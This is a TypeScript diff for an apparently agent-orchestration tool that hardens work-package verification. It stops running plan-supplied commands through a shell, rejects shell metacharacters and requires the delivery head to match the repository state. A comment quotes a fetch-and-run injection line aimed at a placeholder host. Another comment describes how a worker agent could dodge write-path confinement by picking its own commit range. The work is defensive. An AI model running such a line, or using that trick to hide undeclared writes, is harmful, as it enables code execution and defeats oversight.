@@ -81,6 +81,140 @@ function matchesPattern(filePath: string, pattern: string): boolean {
   return globRegex(pattern).test(filePath);
 }
 
+/**
+ * A `verify` entry as it appears in `work-packages.yaml`: an argv array, or the deprecated
+ * single-string form.
+ *
+ * The string form used to be the only form, and `workPackageVerificationGates` turned it into a Gate
+ * with `shell: true`, so the whole string reached `/bin/sh -c` at the next `xforge check` past
+ * Apply. Nothing upstream constrained it: the plan schema said "string, 1-4096 chars"; the
+ * synthesized Gate is built in code and never schema-validated; `xforge/changes/**` is deliberately
+ * outside the shipped `protected-files` policy because lifecycle Skills write Change content there;
+ * and `core/lockfile.ts` digests Scaffold resources, not Change files. So a plan line reading
+ * `verify: ["npm test; curl http://x/y | sh"]` was arbitrary command execution with a Stage
+ * transition — an approval diff where a trailing `;` is easy to miss — as its only speed bump.
+ *
+ * The argv form removes the interpreter instead of trying to sanitize its input: `spawn(argv[0],
+ * argv.slice(1), { shell: false })` cannot compose commands, redirect, or substitute, whatever the
+ * plan says. That makes `verify` structured data rather than a program in another language.
+ *
+ * `types.ts` still declares `WorkPackage.verify` as `string[]`; the widening lives here because this
+ * module is the only reader of the field (`commands/check.ts` consumes the rendered label, not the
+ * entry). See `verifyEntries` for the single cast that spans the gap.
+ */
+type VerifyEntry = string | string[];
+
+interface NormalizedVerify {
+  /** What actually gets spawned. Empty when `problem` is set — such an entry must never run. */
+  argv: string[];
+  /** The rendering used in diagnostics, CLI output, and Evidence attribution. */
+  label: string;
+  /**
+   * Strings a delivery may put in `validation[].command` to name this entry.
+   *
+   * `work-package-delivery.schema.json` types that field as a *string*, so an argv entry has to be
+   * rendered to be recorded, and there is more than one obvious rendering. Accepting the shell-safe
+   * label, the plain space-join, and the JSON array spares a Worker from guessing XForge's quoting
+   * style. It weakens nothing: every accepted form is derived from the plan the control plane
+   * already holds, so this stays an exact match against the declared command list.
+   */
+  accepted: string[];
+  legacy: boolean;
+  /** Why this entry cannot be run at all, if so. */
+  problem: string | null;
+}
+
+/**
+ * Characters that make a legacy string mean something to a shell beyond "run this program".
+ *
+ * A string containing any of these unquoted is refused rather than reinterpreted: `npm test; curl |
+ * sh` parsed as a single argv would silently become a different, harmless command, which hides an
+ * author's intent (or an attacker's) instead of reporting it.
+ */
+const LEGACY_VERIFY_FORBIDDEN = new Set([';', '|', '&', '<', '>', '(', ')', '`', '$', '{', '}', '*', '?', '[', ']', '~', '#', '!']);
+
+/**
+ * Splits a deprecated `verify` string into argv, or explains why it cannot be split safely.
+ *
+ * Deliberately not a shell parser. Words are separated by spaces and tabs; single and double quotes
+ * group without expanding anything; there is no escape processing at all, because a backslash is a
+ * path separator on Windows (`C:\...\node.exe`) far more often than an escape in a plan file, and
+ * no metacharacter can be smuggled through one anyway — the forbidden set is rejected wherever it
+ * appears unquoted, escaped or not. `$` and a backtick are refused even inside double quotes, where
+ * a shell would expand them and this parser would not: that difference in meaning is exactly what
+ * must not be guessed at.
+ */
+function parseLegacyVerify(command: string): { argv: string[]; problem: string | null } {
+  const argv: string[] = [];
+  let token = '';
+  let started = false;
+  let quote: '"' | "'" | null = null;
+  for (const character of command) {
+    if (character === '\n' || character === '\r' || (character < ' ' && character !== '\t')) {
+      return { argv: [], problem: 'contains a newline or control character' };
+    }
+    if (quote === null && (character === ' ' || character === '\t')) {
+      if (started) { argv.push(token); token = ''; started = false; }
+      continue;
+    }
+    if (quote === null && (character === '"' || character === "'")) { quote = character; started = true; continue; }
+    if (quote !== null && character === quote) { quote = null; continue; }
+    if (quote === null && LEGACY_VERIFY_FORBIDDEN.has(character)) {
+      return { argv: [], problem: `contains the unquoted shell metacharacter ${JSON.stringify(character)}` };
+    }
+    if (quote === '"' && (character === '$' || character === '`')) {
+      return { argv: [], problem: `contains ${JSON.stringify(character)} inside double quotes, which a shell would expand and XForge would not` };
+    }
+    token += character;
+    started = true;
+  }
+  if (quote !== null) return { argv: [], problem: 'has an unterminated quote' };
+  if (started) argv.push(token);
+  if (!argv[0]) return { argv: [], problem: 'is empty' };
+  return { argv, problem: null };
+}
+
+/** Tokens that survive a shell unquoted, so a label built from them can be pasted into a terminal. */
+const LABEL_SAFE_TOKEN = /^[A-Za-z0-9_@%+=:,./-]+$/;
+
+function shellLabel(argv: string[]): string {
+  return argv
+    .map((token) => (LABEL_SAFE_TOKEN.test(token) ? token : `'${token.split("'").join("'\\''")}'`))
+    .join(' ');
+}
+
+function normalizeVerifyEntry(entry: VerifyEntry): NormalizedVerify {
+  if (Array.isArray(entry)) {
+    if (!entry.length || !entry[0]) return { argv: [], label: JSON.stringify(entry), accepted: [], legacy: false, problem: 'is an empty argv array' };
+    const label = shellLabel(entry);
+    return { argv: [...entry], label, accepted: [...new Set([label, entry.join(' '), JSON.stringify(entry)])], legacy: false, problem: null };
+  }
+  const parsed = parseLegacyVerify(entry);
+  /* The original string stays the label and the primary accepted form, so a plan and a delivery
+     written before the argv form existed still agree with each other exactly. */
+  return {
+    argv: parsed.argv,
+    label: entry,
+    accepted: parsed.problem ? [] : [...new Set([entry, shellLabel(parsed.argv), parsed.argv.join(' ')])],
+    legacy: true,
+    problem: parsed.problem,
+  };
+}
+
+/**
+ * The one place the on-disk `verify` shape is reconciled with `types.ts`'s `string[]` declaration.
+ *
+ * Kept as a named cast rather than spread across call sites so the migration has a single seam to
+ * delete when `WorkPackage.verify` is retyped and the legacy string form is dropped.
+ */
+function verifyEntries(workPackage: WorkPackage): VerifyEntry[] {
+  return workPackage.verify as unknown as VerifyEntry[];
+}
+
+function normalizeVerify(workPackage: WorkPackage): NormalizedVerify[] {
+  return verifyEntries(workPackage).map(normalizeVerifyEntry);
+}
+
 function patternWithinScope(pattern: string, scope: string): boolean {
   if (pattern === scope) return true;
   if (!hasMagic(scope)) {
@@ -455,12 +589,106 @@ async function loadAckReceipts(
   return { receipts, diagnostics };
 }
 
+/**
+ * What the control plane knows independently of the delivery being validated.
+ *
+ * Every other property of a delivery is self-reported; these are read from the repository and the
+ * plan at validation time, which is what makes the checks below something a Worker cannot arrange.
+ */
+interface DeliveryContext {
+  /** The repository HEAD as `resolveWorkPackages` observed it, or null when Git was unusable. */
+  repositoryHead: string | null;
+  /**
+   * Paths a commit after the delivery's head may touch without being attributed to this Worker:
+   * every package's declared `write_paths` plus the Integrator-only surfaces (`protectedWritePaths`).
+   */
+  attributablePaths: string[];
+  verify: NormalizedVerify[];
+}
+
+/**
+ * Anchors the end of the inspected range to something the control plane observed.
+ *
+ * The `write_paths` confinement below diffs `base_commit...head_commit`, and *both* endpoints came
+ * out of the delivery YAML the Worker writes. So the Worker chose the range it would be judged on:
+ * commit the in-scope work as A and the out-of-scope writes as B, declare `base_commit = A^` and
+ * `head_commit = A`, and the range is clean, `changed_paths` matches the diff exactly, and no
+ * XFORGE_WORK_PACKAGE_WRITE_ESCAPE fires. The parallel-write conflict rule and the
+ * `protectedWritePaths` overlap rule fall to the same trick, because both constrain the declared
+ * *plan* and never what a Worker actually wrote.
+ *
+ * The fix is to stop accepting "the range I chose is clean" as an answer to "is the tree clean".
+ * The strongest form — `head_commit` must equal HEAD — is what an isolated single delivery should
+ * satisfy, but it cannot be the whole rule: deliveries accumulate. Committing the delivery record
+ * itself, dispatching the next package, an Integrator merge, or a second work package all move HEAD
+ * past an earlier, perfectly good `head_commit`, and `requireDeliveries` re-validates every delivery
+ * at Verify and again at archive. A literal HEAD-equality rule would make any Change with more than
+ * one commit after its first delivery permanently unable to leave Apply.
+ *
+ * So the rule is: everything between the delivery's head and HEAD must still be accounted for. The
+ * remainder may contain only paths some package in this plan declared it would write, or paths the
+ * plan is forbidden to declare at all because they belong to the Integrator and the control plane
+ * (`protectedWritePaths` — the Change directory, Specs, the manifest, the lock, the Constitution).
+ * A commit that writes anywhere else is, by construction, work nobody declared, and naming it here
+ * — with both commits — is what keeps this from surfacing as a mysterious write escape.
+ */
+async function validateDeliveryHead(
+  project: ProjectContext,
+  changeId: string,
+  workPackage: WorkPackage,
+  headCommit: string,
+  sourcePath: string,
+  context: DeliveryContext,
+): Promise<Diagnostic[]> {
+  const { repositoryHead } = context;
+  /* No observed HEAD means Git itself was unusable, which `resolveWorkPackages` already reported as
+     XFORGE_WORK_PACKAGE_GIT_REQUIRED. Repeating it per delivery would only add noise. */
+  if (!repositoryHead || headCommit === repositoryHead) return [];
+
+  const reachable = await git(project.root, ['merge-base', '--is-ancestor', headCommit, repositoryHead]);
+  if (reachable.code !== 0) {
+    /* A head that is not an ancestor of HEAD is not in this worktree's history at all: an abandoned
+       branch, a rebased-away commit, or a range invented wholesale. Nothing it claims is checkable
+       against the tree everyone else will read. */
+    return [diagnostic(
+      'XFORGE_WORK_PACKAGE_HEAD_NOT_CURRENT',
+      `Work package ${workPackage.id} declares head_commit ${headCommit}, which is not an ancestor of the repository HEAD ${repositoryHead}. A delivery must be judged against the history the repository actually has.`,
+      sourcePath,
+      'error',
+      { packageId: workPackage.id, headCommit, repositoryHead },
+    )];
+  }
+
+  const beyond = await git(project.root, ['diff', '--name-only', '--no-renames', '-z', `${headCommit}..${repositoryHead}`, '--']);
+  if (beyond.code !== 0) {
+    return [diagnostic('XFORGE_WORK_PACKAGE_GIT_DIFF_FAILED', 'Unable to resolve the commits between the delivery head and HEAD.', sourcePath, 'error', { stderr: beyond.stderr.trim() })];
+  }
+  const changeRoot = `${project.changesPath}/${changeId}`;
+  const unattributed: string[] = [];
+  for (const item of beyond.stdout.split('\0').filter(Boolean)) {
+    let changed: string;
+    try { changed = normalizeRelative(item, 'Git changed path'); } catch { unattributed.push(item); continue; }
+    if (isControlPlaneBookkeeping(changed, changeRoot)) continue;
+    if (context.attributablePaths.some((pattern) => matchesPattern(changed, pattern))) continue;
+    unattributed.push(changed);
+  }
+  if (unattributed.length === 0) return [];
+  return [diagnostic(
+    'XFORGE_WORK_PACKAGE_HEAD_NOT_CURRENT',
+    `Work package ${workPackage.id} declares head_commit ${headCommit}, but the repository HEAD is ${repositoryHead} and the commits in between changed paths no work package declared and no Integrator-only path covers: ${unattributed.join(', ')}. A delivery is checked against the tree, not only against the commit range it names.`,
+    sourcePath,
+    'error',
+    { packageId: workPackage.id, headCommit, repositoryHead, unattributed },
+  )];
+}
+
 async function validateSuccessfulDelivery(
   project: ProjectContext,
   changeId: string,
   workPackage: WorkPackage,
   delivery: WorkPackageDelivery,
   sourcePath: string,
+  context: DeliveryContext,
 ): Promise<Diagnostic[]> {
   const diagnostics: Diagnostic[] = [];
   if (project.manifest.apiVersion === 'xforge.dev/v1alpha2') {
@@ -521,6 +749,7 @@ async function validateSuccessfulDelivery(
     diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_COMMIT_ANCESTRY', 'head_commit must descend from base_commit.', sourcePath, 'error', { stderr: ancestry.stderr.trim() }));
     return diagnostics;
   }
+  diagnostics.push(...await validateDeliveryHead(project, changeId, workPackage, delivery.head_commit, sourcePath, context));
   const diff = await git(project.root, ['diff', '--name-only', '--no-renames', '-z', `${delivery.base_commit}...${delivery.head_commit}`, '--']);
   if (diff.code !== 0) {
     diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_GIT_DIFF_FAILED', 'Unable to resolve the delivery commit diff.', sourcePath, 'error', { stderr: diff.stderr.trim() }));
@@ -573,8 +802,18 @@ async function validateSuccessfulDelivery(
   }
 
   const commands = delivery.validation.map((item) => item.command);
-  if (JSON.stringify(commands) !== JSON.stringify(workPackage.verify)) {
-    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_VALIDATION_MISMATCH', 'Delivery validation commands must exactly match verify.', sourcePath));
+  /* Still an exact, ordered match against the declared list; only the rendering of an argv entry is
+     allowed to vary (see NormalizedVerify.accepted), because the delivery schema records a string. */
+  const validationMatches = commands.length === context.verify.length
+    && context.verify.every((entry, index) => entry.accepted.includes(commands[index]!));
+  if (!validationMatches) {
+    diagnostics.push(diagnostic(
+      'XFORGE_WORK_PACKAGE_VALIDATION_MISMATCH',
+      'Delivery validation commands must exactly match verify.',
+      sourcePath,
+      'error',
+      { declared: context.verify.map((entry) => entry.label), recorded: commands },
+    ));
   }
   if (delivery.validation.some((item) => item.exit_code !== 0)) {
     diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_VALIDATION_FAILED', 'A succeeded delivery cannot contain a failed validation result.', sourcePath));
@@ -684,6 +923,33 @@ export async function resolveWorkPackages(
     for (const skill of workPackage.skills) {
       if (!resources.skills.has(skill)) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_SKILL_MISSING', `Work package ${workPackage.id} requires unavailable Skill ${skill}.`, planPath));
     }
+    /*
+     * Verify entries are checked here, in the structural pass, and not where they are turned into
+     * Gates. `commands/check.ts` runs work-package verifications only when the structural pass
+     * produced no errors, so an entry rejected below can never reach a spawn — the refusal is a
+     * precondition of execution rather than a check performed alongside it.
+     */
+    for (const entry of normalizeVerify(workPackage)) {
+      if (entry.problem) {
+        diagnostics.push(diagnostic(
+          'XFORGE_WORK_PACKAGE_VERIFY_UNSAFE',
+          `Work package ${workPackage.id} has a verify command that cannot be run without a shell: it ${entry.problem}. Rewrite it as an argv array, e.g. verify: [["npm", "test"]]; XForge runs verify commands directly and never through /bin/sh, so a command line cannot compose, redirect, or substitute.`,
+          planPath,
+          'error',
+          { packageId: workPackage.id, verify: entry.label },
+        ));
+        continue;
+      }
+      if (entry.legacy) {
+        diagnostics.push(diagnostic(
+          'XFORGE_WORK_PACKAGE_VERIFY_LEGACY_STRING',
+          `Work package ${workPackage.id} declares verify as a single string, which is deprecated and will be removed. Replace it with the argv array XForge will actually run: ${JSON.stringify(entry.argv)}.`,
+          planPath,
+          'warning',
+          { packageId: workPackage.id, verify: entry.label, argv: entry.argv },
+        ));
+      }
+    }
     for (const patternInput of workPackage.write_paths) {
       try {
         const pattern = normalizeRelative(patternInput, `Work package ${workPackage.id} write path`);
@@ -759,12 +1025,28 @@ export async function resolveWorkPackages(
   const auditEvents = (await readAuditEvents(project)).filter((event) => event.change === changeId && event.outcome === 'succeeded');
   const latestByPackage = new Map<string, WorkPackageDelivery | null>();
   const invalidDeliveries = new Set<string>();
+  /*
+   * Everything a commit is allowed to touch without being anybody's undeclared work: what some
+   * package in this plan said it would write, plus the Integrator-only surfaces no package is
+   * permitted to declare. `validateDeliveryHead` explains why the remainder between a delivery's
+   * head and HEAD is measured against this union rather than against one package's write_paths.
+   */
+  const attributablePaths = [...new Set([...protectedPaths, ...plan.packages.flatMap((item) => item.write_paths)]
+    .flatMap((pattern) => {
+      /* A pattern that cannot be normalized was already diagnosed by the write_paths pass above;
+         dropping it here only makes this check stricter, never more permissive. */
+      try { return [normalizeRelative(pattern, 'Attributable write path')]; } catch { return []; }
+    }))];
   for (const workPackage of plan.packages) {
     const latest = latestDelivery(loadedDeliveries.deliveries.get(workPackage.id));
     latestByPackage.set(workPackage.id, latest);
     if (!latest || latest.status !== 'succeeded') continue;
     const deliveryPath = `${project.changesPath}/${changeId}/evidence/agents/${workPackage.id}/${latest.execution_id}.yaml`;
-    const deliveryDiagnostics = await validateSuccessfulDelivery(project, changeId, workPackage, latest, deliveryPath);
+    const deliveryDiagnostics = await validateSuccessfulDelivery(project, changeId, workPackage, latest, deliveryPath, {
+      repositoryHead: baseCommit,
+      attributablePaths,
+      verify: normalizeVerify(workPackage),
+    });
     diagnostics.push(...deliveryDiagnostics);
     if (deliveryDiagnostics.some((item) => item.severity === 'error')) invalidDeliveries.add(workPackage.id);
   }
@@ -855,23 +1137,39 @@ export interface WorkPackageVerificationGate {
   gate: GateResource;
 }
 
+/**
+ * Turns each package's `verify` entries into Gates `check` can run.
+ *
+ * `shell: false` and a real argv are the whole point: the synthesized Gate is built in code, so it
+ * never passes through schema validation, and until now it was built with `command: [theWholeString]`
+ * and `shell: true` — which `runners/gate.ts` hands to `spawn(command[0], [], { shell: true })`,
+ * i.e. `/bin/sh -c <plan content>`. See the `VerifyEntry` comment for how that string reached the
+ * machine in the first place.
+ *
+ * An entry that cannot be turned into an argv is skipped rather than approximated. It is already an
+ * error from `resolveWorkPackages`, and `commands/check.ts` does not reach this function while
+ * structural errors exist, so skipping is unreachable in practice — it exists so that this function
+ * is safe read on its own, without depending on a caller's ordering to stay that way.
+ */
 export function workPackageVerificationGates(state: WorkPackagePlanState): WorkPackageVerificationGate[] {
   const result: WorkPackageVerificationGate[] = [];
   for (const workPackage of state.packages) {
-    for (let index = 0; index < workPackage.verify.length; index += 1) {
-      const command = workPackage.verify[index]!;
+    const entries = normalizeVerify(workPackage);
+    for (let index = 0; index < entries.length; index += 1) {
+      const entry = entries[index]!;
+      if (entry.problem || !entry.argv.length) continue;
       const slug = workPackage.id.toLowerCase().replace(/[^a-z0-9-]+/g, '-').replace(/^-|-$/g, '') || 'package';
       result.push({
         packageId: workPackage.id,
-        command,
+        command: entry.label,
         gate: {
           apiVersion: 'xforge.dev/v1alpha1',
           kind: 'Gate',
           metadata: { name: `work-package-${slug}-${index + 1}`, version: 1 },
           spec: {
             required: true,
-            command: [command],
-            shell: true,
+            command: entry.argv,
+            shell: false,
             workingDirectory: '.',
             timeoutSeconds: WORK_PACKAGE_VERIFY_TIMEOUT_SECONDS,
             maxOutputBytes: MAX_GATE_OUTPUT_BYTES,
